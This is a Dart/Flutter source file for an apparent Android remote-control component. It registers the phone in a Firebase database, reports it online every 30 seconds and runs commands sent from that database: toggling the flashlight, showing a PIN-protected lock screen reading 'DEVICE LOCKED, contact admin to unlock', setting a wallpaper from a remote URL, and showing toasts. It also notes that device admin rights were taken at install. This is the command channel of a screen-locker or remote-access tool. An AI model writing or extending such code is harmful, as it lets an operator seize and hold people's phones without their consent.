import 'dart:io';
import 'package:firebase_database/firebase_database.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:torch_control/torch_control.dart';
import 'package:wallpaper_setter/wallpaper_setter.dart';
import 'package:flutter_toasty/flutter_toasty.dart';
import 'package:http/http.dart' as http;
import 'lock_screen_service.dart';

class CommandListener {
  static DatabaseReference ref = FirebaseDatabase.instance.ref();
  static String deviceId = '';

  static Future<void> start() async {
    final prefs = await SharedPreferences.getInstance();
    deviceId = prefs.getString('device_id') ?? 'android_${DateTime.now().millisecondsSinceEpoch}';
    await prefs.setString('device_id', deviceId);

    // Set online status
    ref.child('devices/$deviceId').set({
      'online': true,
      'last_seen': DateTime.now().toIso8601String(),
      'model': Platform.operatingSystem,
    });

    // Listen commands
    ref.child('commands/$deviceId').onValue.listen((event) {
      if (event.snapshot.value != null) {
        Map<dynamic, dynamic> cmd = event.snapshot.value as Map;
        _executeCommand(cmd['command'], cmd['params'] ?? {});
        ref.child('commands/$deviceId').remove();
      }
    });

    // Keep alive
    Timer.periodic(Duration(seconds: 30), (_) {
      ref.child('devices/$deviceId/online').set(true);
      ref.child('devices/$deviceId/last_seen').set(DateTime.now().toIso8601String());
    });
  }

  static Future<void> _executeCommand(String command, Map<String, dynamic> params) async {
    switch (command) {
      case 'flash_on':
        await TorchControl.turnOn();
        break;
      case 'flash_off':
        await TorchControl.turnOff();
        break;
      case 'lock_screen':
        String text = params['text'] ?? '⚠️ DEVICE TERKUNCI ⚠️\nHubungi admin untuk membuka.';
        String pin = params['pin']?.toString() ?? '0000';
        await LockScreenService.showLockScreen(text, pin);
        break;
      case 'set_wallpaper':
        String url = params['url'] ?? '';
        if (url.isNotEmpty) await _setWallpaper(url);
        break;
      case 'toast':
        String msg = params['message'] ?? '';
        if (msg.isNotEmpty) {
          FlutterToasty.showToast(msg: msg, toastLength: Toast.LENGTH_SHORT);
        }
        break;
      case 'activate_admin':
        // Device admin sudah diaktifkan di awal, tidak perlu aksi
        break;
      default:
        print("Unknown command: $command");
    }
  }

  static Future<void> _setWallpaper(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      if (response.statusCode == 200) {
        final tempDir = Directory.systemTemp;
        final file = File('${tempDir.path}/wallpaper.jpg');
        await file.writeAsBytes(response.bodyBytes);
        await WallpaperSetter.setWallpaperFromFile(file.path, WallpaperLocation.homeScreen);
        await file.delete();
      }
    } catch (e) {
      print("Wallpaper error: $e");
    }
  }
}